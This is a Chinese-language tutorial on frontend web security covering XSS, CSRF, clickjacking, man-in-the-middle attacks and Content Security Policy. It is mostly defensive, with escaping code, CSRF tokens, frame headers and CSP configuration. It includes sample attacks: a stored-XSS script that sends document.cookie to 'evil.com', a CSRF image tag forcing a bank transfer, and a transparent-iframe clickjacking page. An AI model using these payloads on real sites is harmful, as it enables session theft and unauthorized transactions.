---
title: Web 安全常见攻击
date: 2026-07-21
---

# Web 安全常见攻击

前端安全的核心是**防止用户数据被窃取、防止应用被恶意操控**。

## 一句话总结

**XSS 防注入、CSRF 防伪造、CSP 防执行**——前端安全三板斧。

## XSS（跨站脚本攻击）

### 原理

攻击者往页面里注入恶意脚本，其他用户浏览时脚本执行，窃取 Cookie、Session 等敏感信息。

### 三种类型

| 类型 | 存储位置 | 触发方式 | 危害 |
|------|---------|---------|------|
| **存储型** | 数据库/服务器 | 用户访问页面时自动执行 | 高，影响所有访问者 |
| **反射型** | URL 参数 | 用户点击恶意链接 | 中，需要诱导用户 |
| **DOM 型** | 前端 JS 逻辑 | 前端代码读取不安全数据 | 中，依赖前端实现 |

### 攻击示例

```javascript
// 存储型：评论区注入脚本
// 用户输入：<script>document.location='http://evil.com/steal?c='+document.cookie</script>
// 其他用户访问评论区时，脚本执行，Cookie 被偷走

// 反射型：搜索框反射
// URL: https://example.com/search?q=<script>alert(document.cookie)</script>
// 页面直接渲染 q 参数，脚本执行
```

### 防御方案

| 方案 | 说明 | 适用场景 |
|------|------|---------|
| **转义输出** | 将 `<` `>` `&` `"` `'` 转为 HTML 实体 | 所有用户输入渲染到页面时 |
| **CSP 策略** | 限制脚本来源，禁止内联脚本 | 全局防护 |
| **HttpOnly Cookie** | JS 无法读取 Cookie | 敏感 Cookie |
| **输入过滤** | 过滤或拒绝危险字符 | 表单提交 |

```javascript
// 转义函数示例
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  }
  return str.replace(/[&<>"']/g, s => map[s])
}

// 使用
const userInput = '<script>alert(1)</script>'
element.innerHTML = escapeHtml(userInput)
// 渲染为：&lt;script&gt;alert(1)&lt;/script&gt;
```

## CSRF（跨站请求伪造）

### 原理

攻击者诱导用户在已登录状态下访问恶意页面，恶意页面自动向目标网站发送请求（如转账、改密码），利用的是浏览器的 Cookie 自动携带机制。

### 攻击示例

```html
<!-- 恶意网站：evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
<!-- 用户已登录 bank.com，访问 evil.com 时自动发送转账请求 -->
```

### 防御方案

| 方案 | 说明 | 实现方式 |
|------|------|---------|
| **CSRF Token** | 请求必须携带随机 token | 表单隐藏字段 / Header |
| **SameSite Cookie** | 限制 Cookie 跨站发送 | `Set-Cookie: SessionId=xxx; SameSite=Strict` |
| **验证 Referer** | 检查请求来源 | 服务端校验 |
| **二次确认** | 敏感操作需要密码/验证码 | 转账、改密等场景 |

```javascript
// CSRF Token 示例
// 1. 服务端生成 token 放入页面
<meta name="csrf-token" content="random-token-123">

// 2. 前端请求时携带 token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
  },
  body: JSON.stringify({ to: 'xxx', amount: 100 })
})
```

## 点击劫持（Clickjacking）

### 原理

攻击者用透明 iframe 覆盖目标网站，诱导用户点击看似无害的按钮，实际执行了隐藏操作。

### 攻击示例

```
┌─────────────────────────────────────────────────┐
│  恶意网站：evil.com                              │
│                                                 │
│  🎁 恭喜你！点击领取大奖！                        │
│  ┌─────────────────────────────────────────┐   │
│  │                                         │   │
│  │  [ 点击领取 ]  ← 用户看到的是这个按钮    │   │
│  │                                         │   │
│  │  ┌─────────────────────────────────┐   │   │
│  │  │  透明 iframe（银行转账页面）     │   │   │
│  │  │                                 │   │   │
│  │  │         [ 确认转账 ]            │   │   │
│  │  │         ↑ 实际点击的是这个       │   │   │
│  │  └─────────────────────────────────┘   │   │
│  └─────────────────────────────────────────┘   │
─────────────────────────────────────────────────┘
```

**攻击流程**：
1. 攻击者创建恶意页面，放一个诱人的按钮"点击领取大奖"
2. 在按钮上方覆盖一个透明的 iframe，加载银行的转账确认页面
3. iframe 中的"确认转账"按钮刚好和"点击领取"按钮位置重合
4. 用户以为自己在点"领取大奖"，实际点了"确认转账"

```html
<!-- 恶意页面 evil.com -->
<div style="position: relative; width: 200px; height: 100px;">
  <!-- 诱饵按钮 -->
  <button style="position: absolute; z-index: 1;"> 点击领取大奖</button>
  
  <!-- 透明 iframe，覆盖在按钮上方 -->
  <iframe 
    src="https://bank.com/transfer-confirm" 
    style="position: absolute; opacity: 0; width: 200px; height: 100px;"
  ></iframe>
</div>
```

### 防御方案

```javascript
// 方案 1：X-Frame-Options 响应头（服务端设置）
// X-Frame-Options: DENY        // 禁止任何 iframe 嵌入
// X-Frame-Options: SAMEORIGIN  // 只允许同源嵌入

// 方案 2：CSP frame-ancestors
// Content-Security-Policy: frame-ancestors 'self'

// 方案 3：前端检测（可被绕过，不推荐单独使用）
if (window.top !== window.self) {
  window.top.location = window.self.location
}
```

### 与 CSRF 的区别

点击劫持和 CSRF 都能达到"让用户非本意执行操作"的目的，但攻击手法不同：

| | CSRF | 点击劫持 |
|---|---|---|
| **攻击对象** | 请求 | 界面 |
| **请求来源** | 攻击者构造的假请求 | 用户点击的真实按钮 |
| **用户操作** | 可能完全无感（自动触发） | 必须手动点击 |
| **防御方式** | CSRF Token、SameSite Cookie | X-Frame-Options、CSP |

**CSRF 示例**：
```html
<!-- 攻击者构造的请求，用户访问即触发 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```
用户什么都没点，请求就发出去了。

**点击劫持示例**：
```html
<!-- 用户点的是真实银行页面的真实按钮 -->
<iframe src="https://bank.com/transfer-confirm"></iframe>
```
用户确实点了"确认转账"，但不知道自己点在 iframe 里。

两者经常结合使用：点击劫持是**手段**（诱导点击），CSRF 是**目的**（执行非本意操作）。

## 中间人攻击（MITM）

### 原理

攻击者在用户和服务器之间拦截、篡改通信内容。

### 防御方案

| 方案 | 说明 |
|------|------|
| **HTTPS** | 加密传输，防止窃听和篡改 |
| **HSTS** | 强制使用 HTTPS，防止降级攻击 |
| **证书固定** | 客户端校验服务器证书指纹 |

```javascript
// HSTS 响应头（服务端设置）
// Strict-Transport-Security: max-age=31536000; includeSubDomains
// 浏览器收到后，365 天内该域名强制用 HTTPS
```

## CSP（内容安全策略）

### 是什么

CSP（Content Security Policy）是一个**白名单机制**，告诉浏览器只允许加载和执行指定来源的资源。它是防御 XSS 和数据注入攻击的终极武器。

### 能防什么

| 攻击类型 | CSP 如何防御 |
|---------|-------------|
| **XSS** | 禁止执行非白名单的脚本 |
| **数据注入** | 限制脚本能访问的 DOM API |
| **点击劫持** | `frame-ancestors` 限制谁能嵌入你 |
| **资源劫持** | 只允许加载指定来源的图片、样式、字体 |

### 核心指令

```http
# 基础策略：只允许同源资源
Content-Security-Policy: default-src 'self'

# 脚本：只允许同源 + 指定 CDN
Content-Security-Policy: script-src 'self' https://cdn.example.com

# 样式：允许同源 + Google Fonts
Content-Security-Policy: style-src 'self' https://fonts.googleapis.com

# 图片：允许同源 + 数据 URI + 指定域名
Content-Security-Policy: img-src 'self' data: https://images.example.com

# 禁止内联脚本（防 XSS 关键）
Content-Security-Policy: script-src 'self'  # 没有 'unsafe-inline'

# 禁止 eval（防代码注入）
Content-Security-Policy: script-src 'self'  # 没有 'unsafe-eval'
```

### 常用指令速查

| 指令 | 控制对象 | 示例 |
|------|---------|------|
| `default-src` | 默认策略（其他指令的 fallback） | `default-src 'self'` |
| `script-src` | JavaScript 来源 | `script-src 'self' 'nonce-xxx'` |
| `style-src` | CSS 来源 | `style-src 'self' 'unsafe-inline'` |
| `img-src` | 图片来源 | `img-src 'self' data: blob:` |
| `font-src` | 字体来源 | `font-src 'self' https://fonts.gstatic.com` |
| `connect-src` | XHR/fetch/WebSocket | `connect-src 'self' https://api.example.com` |
| `frame-ancestors` | 谁能嵌入我（防点击劫持） | `frame-ancestors 'self'` |
| `base-uri` | `<base>` 标签的 URL | `base-uri 'self'` |
| `form-action` | 表单能提交到哪里 | `form-action 'self'` |

### 特殊值

| 值 | 含义 |
|----|------|
| `'self'` | 同源（协议 + 域名 + 端口都相同） |
| `'unsafe-inline'` | 允许内联脚本/样式（降低安全性） |
| `'unsafe-eval'` | 允许 `eval()` 等动态代码（降低安全性） |
| `'none'` | 禁止任何来源 |
| `data:` | 允许 data URI（如 `data:image/png;base64,...`） |
| `blob:` | 允许 blob URL |
| `'nonce-xxx'` | 允许带指定 nonce 的脚本（推荐替代 unsafe-inline） |
| `'sha256-xxx'` | 允许哈希匹配的内联脚本 |

### 实战配置

```javascript
// Node.js + Express 示例
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' 'nonce-random123'",
    "style-src 'self' 'unsafe-inline'",  // 样式通常允许内联
    "img-src 'self' data: https:",
    "font-src 'self' https://fonts.gstatic.com",
    "connect-src 'self' https://api.example.com",
    "frame-ancestors 'self'",  // 防点击劫持
    "base-uri 'self'",
    "form-action 'self'"
  ].join('; '))
  next()
})
```

```html
<!-- 使用 nonce 允许特定内联脚本 -->
<script nonce="random123">
  // 这个脚本会被执行
  console.log('safe inline script')
</script>

<script>
  // 没有 nonce，会被 CSP 拦截
  alert('blocked by CSP')
</script>
```

### 报告模式（只报告不拦截）

调试 CSP 时可以用 `Content-Security-Policy-Report-Only`，违规时只报告不拦截：

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

浏览器会 POST 违规详情到 `/csp-report`：

```json
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src",
    "blocked-uri": "https://evil.com/malicious.js"
  }
}
```

### 常见误区

❌ **CSP 设置了就万事无忧**
> CSP 是纵深防御的一层，不能替代输入转义、HttpOnly Cookie 等其他措施。

❌ **为了省事直接加 `'unsafe-inline'`**
> 这会让 CSP 防 XSS 的效果大打折扣。优先用 `nonce` 或 `hash` 替代。

❌ **CSP 能防 CSRF**
> CSP 主要防 XSS 和资源加载，CSRF 需要 Token 或 SameSite Cookie 来防。

## 常见误区

❌ **前端做安全校验就够了**
> 前端校验只防君子不防小人，所有安全校验必须在服务端重复执行。

❌ **用了 HTTPS 就绝对安全**
> HTTPS 防中间人，但防不了 XSS、CSRF 等应用层攻击。

❌ **Cookie 设了 HttpOnly 就万事无忧**
> HttpOnly 只防 XSS 偷 Cookie，CSRF 攻击中 Cookie 还是会正常发送。
